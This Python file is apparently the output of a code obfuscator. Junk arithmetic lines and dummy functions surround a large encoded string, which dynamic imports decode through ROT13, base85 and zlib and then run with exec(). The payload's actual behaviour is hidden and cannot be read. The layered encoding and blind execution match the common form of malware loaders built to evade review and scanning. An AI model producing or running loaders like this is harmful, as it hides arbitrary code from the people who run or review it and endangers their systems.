
# === Obfuscated Python Code ===
# Generated by 0xSec Obfuscator

VhkUeuVCOQmf = 219 * 479  # junk calc
def srMzzjujiDSG(): return 3831
RTlVKPHqMTuR = 620 * 907  # junk calc
def FogxxNUkgewv(): return 7062
iWLcmLnaAJLL = 253 * 244  # junk calc
def XadzICOyKgAc(): return 3978
MnpSOWBsrlrl = 459 * 973  # junk calc
def nQPWEDjClXCp(): return 7752
QaTlhnjNnvlR = 377 * 836  # junk calc
def UyMdRvgptwzP(): return 3176
wBITydweujqY = 629 * 419  # junk calc
def WcnXpgHGFnCj(): return 2443
hfEmzmTJGmkM = 774 * 508  # junk calc
def NgbyiPDxfjnf(): return 6942
PsevFnkHnGAz = 731 * 115  # junk calc
def FIVoqJClQCuO(): return 7398
UkrfHRsrdHEq = 196 * 348  # junk calc
def FEGfqFxZNHGz(): return 5357
XyaQyFcPisCX = 186 * 294  # junk calc
def EQsEzAaQPMCx(): return 3184
ncxvCklXRJWu = 468 * 508  # junk calc
def TxhuyoHFEQFr(): return 6860
ZKkvCFePeOXH = 271 * 466  # junk calc
def lHtIVRCcOfEK(): return 9855
OhWHQhuTnCvK = 291 * 240  # junk calc
def WIGZxFgwxwil(): return 6493
niijtrtRiRJy = 13 * 344  # junk calc
def ZSkoRUkFrjfa(): return 5426
qJtmpVewefAR = 218 * 332  # junk calc
def RuYrnZdGzeTp(): return 3369
uXWzodHUPMdw = 949 * 820  # junk calc
def BJOiEeAOflLL(): return 5610
GKKIZiDFJDur = 758 * 718  # junk calc
def FBwKxezXJDUL(): return 9032
QSzPlMaLIEZI = 934 * 977  # junk calc
def RmwQHNVvpNAo(): return 4123
rmzFbYQfBDaM = 263 * 25  # junk calc
def MoLAtdciVZTa(): return 7412
UNCiTnnfAmSl = 336 * 545  # junk calc
def wpTnSCaxIQGP(): return 3683

RngWOkWWFXOV = "p%0b>GJ{BD6@XGuz}ZFSo!TngElX@sX(IQ*Fy?uC8>S^QwUfp+UBKBFZm$5#m&`S{tRxSAT%gA9(7%;z(ynkcY{tI}DRL)$N!72(aE7cs-!C0*$^_!RAGnMP1qCHe#5wmpz~s7I1pwDGRf4wCJ@V$I^#-3A{+Xo62dmrrS(J+E)s+X_2JBA<?E(;a1!ru;u%l}TbT(z5DNMhuAS7~>Av<n<ym=p9<^)STw|zfgSlgA^BCCpq(q@N?fGflVi`>>Q9S7?yNk#LSaXm<ocr8pd!k|$Vb;MP*MzUjo*ss;sPssC_kr-mF25mGKbt*BSUEOqK;yCiVVI@wMBSpnwxf&lAX)I25w%-UX2>F%kt<^lmow%E;#GMN(KWv23330@0Zm4Y;rgd6Y_SxE#lk!>#?TgV+^CE?XJ9!Ni_LWdmV&7p37{7KC(MFgGp+>q(+kZZ#`@Wf?k^3_VuiN!{Vt_$~*l?%E11L1vl}v+OM0>kjEnxTTo-t#|A3o54OYA<`>+3vG9t*4MC&DbrD}Uyj*J)@G$fb(EK&3_%NH`6Dq4wZjBzWx^Gz!+6n)(q2NuO)i5j}aaAX%4us|^MnPOv}^;fwM0lU(F&DJud{>*SYYRFVS8y(aK5Www}T_GEAz9?{cb{8TV>rZLzc+3s<(zTf4;we{W<HdNu^Q(GM-g5CZ~z(eUz^{rFd-5+AuVE(i>=I})@h+MnGz_RiVOpe@gozNxYD~c^tSJAr9KLEjveyD@8EGvPQal-&o=%1T;_-kRfgdfua($kUE5$7hHI$fTG-v6zpc3Z25G)&+oKc?V7S1!OhHip%s(;{8{umpK=>(75wgi9{U({bu*K`M)--Pd0t5Ns`7h=Vy_c0_KOl+`!)NYi}9_wE{-_~mOJ(J{k9{aB)uJqoZhyqnUgcC1IW_3B)`5GNOO-GvYf2<30nZVwo|y-48Z=AgSTPp3Ydqi^Z^rpaQzhvzKy?YU0l5+(%HJCgK=N!LmJ2!R0EGWBFa_JlG%S)|rX`a(B0=5cvlt81x(2ghR1U+UIx8bQ^{bhCr({Gfcm2|Uji6tnHc9YrlPY_?zFHWwx?3?ltW1$WW95#LEAdS7Bzc#`0l#nl~m6GY~C!wc*A0s3$qdaVoyN7FOm1VgOXkX}FG3HI)vQ^cyz9R2FNOwC1ttl6YG#!@68<_p$h87R#$2Y#ej!`|_pUQ!35-fXdSAqM^rEvVs%11kLr^Da$E7!k`p&7TCBX<<5#vyKaSOyUL);Pm927DFZ*Y6sWOO)0z$h6Rb}PCu=qyRhSvD-#5^oO!LgL)_8@NBnk&%(Otz8c0tMi0X92DonI(;D})hO5i0sgjjLuPEBK8JDjrPR`p+WNb_UoP#h8}^P46~@g{>i2Zz|v#xy_l@e88_lc}559m+CXf<!6LW8;}zlu`h<qKX8eWq!1ovHLQ7C(JSKIoOnEAOIEl(Kz#k42F?XSLD!}b?^^HrD|LaO;fuIY{raZ&*sEYK$PLNLKBrXKlG$4tWI=3nu&vdAV)38U0DG#$l>Cdo>4X*i+e=QxY8NT`=rC1*X`as*TS4E1t3xiDBAMp_mC*vseO4C2@4=4(q3)z^>bFOY3b=E(}l`GJBFFv)^sKb9e^Qv6jt2&W6*X7yvg6P;VnJ>LLsu!J9}xWGwUmfpEA=EI+WY;PGDkF4pZoOXT3;j!AXuaDdfY$R*ZEDqkl{~m@0fmuvY;aS7>x_;FOa$P_(a!yD*xDQQTO;^zA@>OoZ}ZjO<e}*PN8B(!IVLGA^F{fmD1Nsx3>F7oWq(^3*zBwn5yVdw!JfU}kzS`x)xKlh`8iPukNkW}W{7mwT~O?X<qiuMRhKH^u%$W1|Dan+Ech7tX(sfNBu2lu?B-@}$6B9_~Ii&NViVX!WAJ5`-b28bQY+L&ojzxAnLuyOBy?j<-sCcGmD=xJRu;1Dkv|6c~+K+{)aHfS~#=>4m)Ypn>U*k3wRNqLc|uUYaHJnWOCc=PbImi?DoBklMd33ZFu{i9(bT_5$O3m!1Dmh(LWldnr&Fz3%4Q5%<RMOAYaV4Uzq_1ew)FRRW@dNNB6=gUsZf#+tWi(uwU)CNwUcKnh1g;;W88A8A*Xi>-BP{tcgr0SL3nNGp62$ov<+hosVGEQs7h?)YKv$D}NbuQW~5wiGFw{e$oTJL-5ji-rCc0?LgXT_j-Lml!6`N3#Iycea9CA<VGGs4hPGgaluj7@#Ayz#lyGiy+^drtr~$tu@VHb-6<;X=z-lgVv0m^<=}GQfuba1ONyQT?H4DNRdV+jFX2O7AGOkk(|k`jR+CSgFT<JeP5i{nihJCih9@2E)jI_?HitR8HWdm*@dY#z?p`cgrE(U>&ExBjHO)c_b@2b8b_OAj^W4px_1^Hsv&21RdB0#*Z>1~+Ca7N(qx<yES}JVZv&l#$lp{36a{xt8?U@l003%ubjquVk#XiuH1b;Ds7vOFrQ6f>Xc1nfK+GZ`jI5;0L9&*rf)q(MjtZh-MA=ddsH&{`NZ0dq+)yK?2p~OKWDqWshMcM!%pR9~)>GfX>nGmZ(>3nMAlgMW;BBhn#i8=jpT__^hX_U(P90ckTsYME6x0kmB#zM5uY`R2U~{ueRATq<QPq`u89U7p++_BQX8@3rm`J26s0ti800a9hkP`h-RSsIiSY*K8%fSZ>Ue2qmrkyVXz!AalBe}SoeO+t8J($u0KJ5m?GN6%R0W!HH@@h*0$?kG+=tTa0q8LCHCzmOP8XHV*"

# Dynamic imports
_import_zlib = __import__('zlib')
_import_b85 = __import__('base64').b85decode
_import_rot13 = __import__('codecs').decode

YqIGgijqYSZU = (lambda data: _import_zlib.decompress(_import_b85(_import_rot13(data, 'rot_13'))))
iXDanZAATRrB = (lambda payload: exec(payload, {'__name__':'__main__'}))

# Nested execution
(lambda f: (lambda x: f(x))(RngWOkWWFXOV))(
    lambda c: iXDanZAATRrB(YqIGgijqYSZU(c))
)
